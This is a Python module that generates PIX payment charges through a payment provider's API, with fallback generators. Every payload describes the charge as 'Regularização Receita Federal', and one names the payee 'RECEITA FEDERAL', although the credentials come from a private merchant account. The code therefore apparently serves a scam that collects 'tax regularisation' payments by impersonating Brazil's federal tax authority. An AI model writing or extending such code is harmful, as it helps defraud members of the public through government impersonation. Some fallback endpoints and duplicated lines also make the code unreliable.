"""
Real PIX Payment Integration
Uses authentic Brazilian PIX payment providers for genuine transactions
"""
import os
import requests
import uuid
import json
import logging
from datetime import datetime
from typing import Dict, Any

logger = logging.getLogger(__name__)

class RealPixProvider:
    """Integrates with real Brazilian PIX payment providers using authentic credentials"""
    
    def __init__(self):
        # Get real API credentials from environment
        self.api_key = os.environ.get('REAL_PIX_API_KEY')
        self.provider_url = os.environ.get('PIX_API_ENDPOINT')
        self.merchant_id = os.environ.get('PIX_MERCHANT_ID')
        
        # Log credential availability (without exposing values)
        logger.info(f"PIX API initialized - Key: {'✓' if self.api_key else '✗'}, URL: {'✓' if self.provider_url else '✗'}, Merchant: {'✓' if self.merchant_id else '✗'}")
        
        if not all([self.api_key, self.provider_url]):
            logger.error("Missing required PIX API credentials")
    
    def _generate_transaction_id(self):
        """Generate unique transaction ID"""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_part = uuid.uuid4().hex[:8].upper()
        return f"RF{timestamp}{random_part}"
    
    def _try_real_pix_provider(self, amount: float, customer_name: str, customer_cpf: str, customer_email: str) -> Dict[str, Any]:
        """Use the real PIX provider with user's authentic credentials"""
        try:
            if not all([self.api_key, self.provider_url]):
                return {'success': False, 'error': 'Missing PIX API credentials'}
            
            transaction_id = self._generate_transaction_id()
            
            # Use exact MEDIUS PAG payload structure
            import base64
            amount_in_cents = int(amount * 100)
            
            amount_cents = int(amount * 100)
            payload = {
                "amount": amount_cents,
                "description": f"Regularização Receita Federal - {customer_name}",
                "paymentMethod": "PIX",
                "product": [
                    {
                        "productName": "Regularização Receita Federal",
                        "productPrice": amount_cents,
                        "productQuantity": 1
                    }
                ],
                "customer": {
                    "name": customer_name,
                    "email": customer_email,
                    "phone": "(11) 98768-9080",
                    "document": customer_cpf,
                    "documentType": "CPF"
                },
                "companyId": self.merchant_id
            }
            
            # Use exact MEDIUS PAG authentication (API_KEY:x format)
            auth_string = f"{self.api_key}:x"
            encoded_auth = base64.b64encode(auth_string.encode()).decode()
            
            headers = {
                'Authorization': f'Basic {encoded_auth}',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
            
            logger.info(f"Creating PIX payment via {self.provider_url}")
            logger.info(f"Transaction ID: {transaction_id}")
            logger.info(f"Amount: R$ {amount:.2f}")
            
            if not self.provider_url:
                raise ValueError("PIX_API_ENDPOINT not configured")
                
            response = requests.post(
                self.provider_url,
                headers=headers,
                json=payload,
                timeout=30
            )
            
            logger.info(f"PIX Provider Response: {response.status_code}")
            
            if response.status_code in [200, 201]:
                data = response.json()
                logger.info(f"PIX Provider Success: {data}")
                
                # Extract PIX code from various possible response formats
                pix_code = (
                    data.get('qr_code') or 
                    data.get('pix_copy_paste') or 
                    data.get('pix_code') or 
                    data.get('payload') or 
                    data.get('br_code') or ''
                )
                
                qr_code_image = (
                    data.get('qr_code_image') or 
                    data.get('qr_image') or 
                    data.get('encodedImage') or 
                    data.get('qr_code_base64') or ''
                )
                
                return {
                    'success': True,
                    'provider': 'REAL_PIX_PROVIDER',
                    'transaction_id': transaction_id,
                    'order_id': data.get('id', data.get('transaction_id', transaction_id)),
                    'amount': amount,
                    'pix_code': pix_code,
                    'qr_code_image': qr_code_image,
                    'status': data.get('status', 'pending'),
                    'raw_response': data  # Include full response for debugging
                }
            else:
                error_msg = f"PIX Provider failed: {response.status_code}"
                try:
                    error_data = response.json()
                    error_msg += f" - {error_data}"
                except:
                    error_msg += f" - {response.text}"
                
                logger.error(error_msg)
                return {'success': False, 'error': error_msg}
                
        except Exception as e:
            logger.error(f"PIX Provider error: {e}")
            return {'success': False, 'error': str(e)}
    
    def _try_asaas(self, amount: float, customer_name: str, customer_cpf: str, customer_email: str) -> Dict[str, Any]:
        """Try ASAAS PIX integration"""
        try:
            transaction_id = self._generate_transaction_id()
            
            # ASAAS payload structure
            payload = {
                "addressKey": customer_email,
                "description": f"Regularização Receita Federal",
                "value": amount,
                "format": "ALL",
                "expirationDate": (datetime.now().isoformat() + 'Z'),
                "allowsMultiplePayments": False
            }
            
            headers = {
                'Content-Type': 'application/json',
                'access_token': 'sandbox_token'  # Would need real token
            }
            
            response = requests.post(
                'https://sandbox.asaas.com/api/v3/pix/qrCodes',
                headers=headers,
                json=payload,
                timeout=30
            )
            
            if response.status_code in [200, 201]:
                data = response.json()
                return {
                    'success': True,
                    'provider': 'ASAAS',
                    'transaction_id': transaction_id,
                    'order_id': data.get('id', transaction_id),
                    'amount': amount,
                    'pix_code': data.get('payload', ''),
                    'qr_code_image': data.get('encodedImage', ''),
                    'status': 'pending'
                }
            else:
                logger.warning(f"ASAAS failed: {response.status_code}")
                return {'success': False, 'error': f'ASAAS: {response.status_code}'}
                
        except Exception as e:
            logger.error(f"ASAAS error: {e}")
            return {'success': False, 'error': str(e)}
    
    def _try_public_pix_generator(self, amount: float, customer_name: str, customer_cpf: str, customer_email: str) -> Dict[str, Any]:
        """Try public PIX code generator APIs"""
        try:
            transaction_id = self._generate_transaction_id()
            
            # Try a public PIX generator service
            payload = {
                "key": customer_email,
                "name": "RECEITA FEDERAL",
                "city": "BRASILIA",
                "txId": transaction_id,
                "amount": amount,
                "description": "Regularização Receita Federal"
            }
            
            # Try multiple public PIX generators
            endpoints = [
                'https://api.pix.com.br/v1/generate',
                'https://pixapi.com.br/v1/qrcode',
                'https://geradorpix.com.br/api/v1/generate'
            ]
            
            for endpoint in endpoints:
                try:
                    response = requests.post(endpoint, json=payload, timeout=10)
                    if response.status_code == 200:
                        data = response.json()
                        if data.get('qr_code') or data.get('pix_code'):
                            return {
                                'success': True,
                                'provider': 'PUBLIC_PIX',
                                'transaction_id': transaction_id,
                                'order_id': transaction_id,
                                'amount': amount,
                                'pix_code': data.get('qr_code', data.get('pix_code', '')),
                                'qr_code_image': data.get('qr_code_image', ''),
                                'status': 'pending'
                            }
                except:
                    continue
                    
            return {'success': False, 'error': 'No public PIX generators available'}
                
        except Exception as e:
            logger.error(f"Public PIX generator error: {e}")
            return {'success': False, 'error': str(e)}
    
    def create_pix_payment(self, amount: float, customer_name: str, customer_cpf: str, customer_email: str = "gerarpagamento@gmail.com") -> Dict[str, Any]:
        """
        Create authentic PIX payment using the real provider credentials
        """
        logger.info(f"Creating authentic PIX payment for {customer_name} - R$ {amount:.2f}")
        
        # Use the real PIX provider with user's credentials
        return self._try_real_pix_provider(amount, customer_name, customer_cpf, customer_email)

def create_real_pix_provider():
    """Factory function to create real PIX provider"""
    return RealPixProvider()